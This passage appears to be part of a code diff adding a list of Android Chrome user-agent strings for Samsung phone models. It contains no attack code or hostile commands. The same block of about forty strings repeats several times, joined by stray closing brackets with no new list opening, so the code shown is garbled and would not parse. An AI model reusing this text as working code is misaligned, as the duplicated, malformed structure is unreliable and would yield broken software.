+    "Mozilla/5.0 (Linux; Android 12; SM-S908B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 11; SM-G991N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 10; SM-G996N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 14; SM-G998N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 13; SM-G9810) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 12; SM-G9860) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 11; SM-G9880) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 10; SM-G9700) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 14; SM-G9730) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 13; SM-G9750) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 12; SM-N9810) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 11; SM-N9860) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 10; SM-N9700) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 14; SM-N9750) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 13; SM-A515U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 12; SM-A525U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 11; SM-A536U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 10; SM-A546U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 14; SM-A715U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 13; SM-A725U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 12; SM-A736U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 11; SM-M105F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 10; SM-M115F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 14; SM-M127F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 13; SM-M205F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 12; SM-M215F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 11; SM-M305F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 10; SM-M315F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 14; SM-M325F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 13; SM-M405F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 12; SM-M426B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 11; SM-M515F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 10; SM-M526B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 14; SM-M625F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 13; SM-E025F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 12; SM-E127F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 11; SM-E225F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 10; SM-E305F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 14; SM-E426B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 13; SM-E526B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 12; SM-E625F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
+]
+    "Mozilla/5.0 (Linux; Android 14; SM-S901B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 13; SM-S906B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 12; SM-S908B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 11; SM-G991N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 10; SM-G996N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 14; SM-G998N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 13; SM-G9810) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 12; SM-G9860) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 11; SM-G9880) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 10; SM-G9700) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 14; SM-G9730) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 13; SM-G9750) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 12; SM-N9810) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 11; SM-N9860) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 10; SM-N9700) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 14; SM-N9750) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 13; SM-A515U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 12; SM-A525U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 11; SM-A536U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 10; SM-A546U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 14; SM-A715U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 13; SM-A725U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 12; SM-A736U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 11; SM-M105F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 10; SM-M115F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 14; SM-M127F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 13; SM-M205F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 12; SM-M215F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 11; SM-M305F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 10; SM-M315F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 14; SM-M325F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 13; SM-M405F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 12; SM-M426B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 11; SM-M515F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 10; SM-M526B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 14; SM-M625F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 13; SM-E025F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 12; SM-E127F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 11; SM-E225F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 10; SM-E305F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 14; SM-E426B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 13; SM-E526B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 12; SM-E625F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
+]
+    "Mozilla/5.0 (Linux; Android 14; SM-S901B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 13; SM-S906B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 12; SM-S908B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 11; SM-G991N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 10; SM-G996N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 14; SM-G998N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 13; SM-G9810) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 12; SM-G9860) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 11; SM-G9880) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 10; SM-G9700) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 14; SM-G9730) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 13; SM-G9750) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 12; SM-N9810) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 11; SM-N9860) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 10; SM-N9700) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 14; SM-N9750) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 13; SM-A515U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 12; SM-A525U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 11; SM-A536U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 10; SM-A546U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 14; SM-A715U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 13; SM-A725U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 12; SM-A736U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 11; SM-M105F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 10; SM-M115F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 14; SM-M127F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 13; SM-M205F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 12; SM-M215F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 11; SM-M305F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 10; SM-M315F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 14; SM-M325F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 13; SM-M405F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 12; SM-M426B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 11; SM-M515F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 10; SM-M526B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 14; SM-M625F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 13; SM-E025F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 12; SM-E127F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 11; SM-E225F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 10; SM-E305F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 14; SM-E426B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 13; SM-E526B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 12; SM-E625F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
+]
+    "Mozilla/5.0 (Linux; Android 14; SM-S901B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 13; SM-S906B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 12; SM-S908B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 11; SM-G991N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 10; SM-G996N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 14; SM-G998N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 13; SM-G9810) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 12; SM-G9860) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 11; SM-G9880) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 10; SM-G9700) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 14; SM-G9730) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 13; SM-G9750) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 12; SM-N9810) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 11; SM-N9860) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 10; SM-N9700) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 14; SM-N9750) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 13; SM-A515U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 12; SM-A525U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 11; SM-A536U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 10; SM-A546U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 14; SM-A715U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 13; SM-A725U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 12; SM-A736U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 11; SM-M105F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 10; SM-M115F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 14; SM-M127F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 13; SM-M205F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 12; SM-M215F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 11; SM-M305F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 10; SM-M315F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 14; SM-M325F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 13; SM-M405F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 12; SM-M426B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 11; SM-M515F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 10; SM-M526B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 14; SM-M625F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 13; SM-E025F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 12; SM-E127F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 11; SM-E225F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 10; SM-E305F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 14; SM-E426B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 13; SM-E526B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 12; SM-E625F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
+]
+    "Mozilla/5.0 (Linux; Android 14; SM-S901B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 13; SM-S906B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 12; SM-S908B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 11; SM-G991N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 10; SM-G996N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 14; SM-G998N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 13; SM-G9810) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 12; SM-G9860) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 11; SM-G9880) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 10; SM-G9700) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 14; SM-G9730) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 13; SM-G9750) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 12; SM-N9810) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 11; SM-N9860) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 10; SM-N9700) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 14; SM-N9750) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 13; SM-A515U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36",
